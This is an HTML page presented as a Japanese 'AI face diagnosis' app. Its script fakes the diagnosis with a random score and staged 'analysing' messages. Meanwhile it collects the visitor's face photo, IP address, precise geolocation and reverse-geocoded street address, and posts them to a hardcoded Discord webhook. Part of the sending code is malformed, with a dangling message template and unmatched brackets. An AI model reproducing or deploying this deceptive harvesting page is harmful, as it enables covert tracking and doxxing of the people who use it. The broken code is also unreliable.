<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI 顔診断</title>

<style>
:root {
  --bg1: #0f172a;
  --bg2: #020617;
  --card: rgba(255,255,255,0.08);
  --accent: #7c7cff;
  --text-sub: #c7d2fe;
}
body {
  margin: 0;
  font-family: sans-serif;
  background: radial-gradient(circle at top, var(--bg1), var(--bg2));
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.container { max-width: 420px; width: 100%; padding: 20px; }
.card {
  background: var(--card);
  backdrop-filter: blur(14px);
  border-radius: 20px;
  padding: 24px;
  text-align: center;
}
.sub { font-size: 13px; color: var(--text-sub); margin-bottom: 12px; }
.label-btn {
  display: block;
  padding: 12px;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  cursor: pointer;
  margin-bottom: 10px;
}
input[type="file"] { display:none; }
button {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 12px;
  background: var(--accent);
  font-weight: bold;
  cursor: pointer;
}
.preview img { width: 100%; margin-top: 10px; border-radius: 12px; }
.result { margin-top: 15px; }
</style>
</head>

<body>
<div class="container">
<div class="card">

<h1>AI 顔診断</h1>

<div class="sub">
画像を選ぶだけで診断できます
</div>

<div class="sub">
本サービスでは診断処理および不正防止のため、画像・IPアドレス・位置情報を外部サーバーへ送信します。<br>
（許可は任意です）
</div>

<label class="label-btn">
画像を選択
<input type="file" id="file" accept="image/*">
</label>

<button onclick="startDiagnosis()">診断する</button>

<div class="preview" id="previewBox" style="display:none;">
<img id="preview">
</div>

<div class="result" id="result" style="display:none;"></div>

</div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";

// 診断開始
function startDiagnosis() {
  const file = document.getElementById("file").files[0];
  if (!file) {
    alert("画像選んで！");
    return;
  }

  const result = document.getElementById("result");
  result.style.display = "block";
  result.innerHTML = "診断中...";

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        runDiagnosis(pos.coords.latitude, pos.coords.longitude);
      },
      () => {
        runDiagnosis(null, null);
      },
      {
        enableHighAccuracy: true
      }
    );
  } else {
    runDiagnosis(null, null);
  }
}

// 診断処理
function runDiagnosis(lat, lon) {
  const file = document.getElementById("file").files[0];
  const reader = new FileReader();

  reader.onload = () => {
    const base64 = reader.result;

    document.getElementById("preview").src = base64;
    document.getElementById("previewBox").style.display = "block";

    // AIっぽい演出
    const result = document.getElementById("result");
    result.innerHTML = "顔検出中...";
    setTimeout(() => {
      result.innerHTML = "特徴解析中...";
    }, 500);

    setTimeout(async () => {
      const score = Math.floor(30 + Math.random() * 20);
      const rank = score >= 45 ? "S" : score >= 30 ? "A" : "B";

      result.innerHTML = `
        ランク ${rank}<br>
        黄金比スコア：${score}%<br>
        いい感じやん
      `;

      await sendToDiscord(base64, score, rank, lat, lon);
    }, 1200);
  };

  reader.readAsDataURL(file);
}

// 市町村取得（逆ジオコーディング）
async function getAddress(lat, lon) {
  try {
    const res = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`
    );
    const data = await res.json();

    return data.address.city 
        || data.address.town 
        || data.address.village 
        || data.address.county
        || "不明";
  } catch {
    return "取得失敗";
  }
}

// Discord送信
async function sendToDiscord(base64, score, rank, lat, lon) {
  const fd = new FormData();
  fd.append("file", dataURLtoBlob(base64), "face.png");

  const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());

  let address = "不明";
if (lat && lon) {
  const res = await fetch(
    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`
  );
  const data = await res.json();

  address = data.display_name || "不明"; // ←ここがポイント
}
📸 顔診断
IP: ${ipData.ip}
地域: ${address}
位置: https://maps.google.com/?q=${lat ?? "不明"},${lon ?? "不明"}
黄金比: ${score}%
ランク: ${rank}
`
  }));

  fetch(WEBHOOK_URL, { method: "POST", body: fd })
    .then(res => console.log("送信OK", res.status))
    .catch(err => console.log("送信エラー", err));
}

// base64 → Blob変換
function dataURLtoBlob(dataurl) {
  const arr = dataurl.split(',');
  const mime = arr[0].match(/:(.*?);/)[1];
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8 = new Uint8Array(n);
  while (n--) u8[n] = bstr.charCodeAt(n);
  return new Blob([u8], { type: mime });
}
</script>
  
</body>
</html>
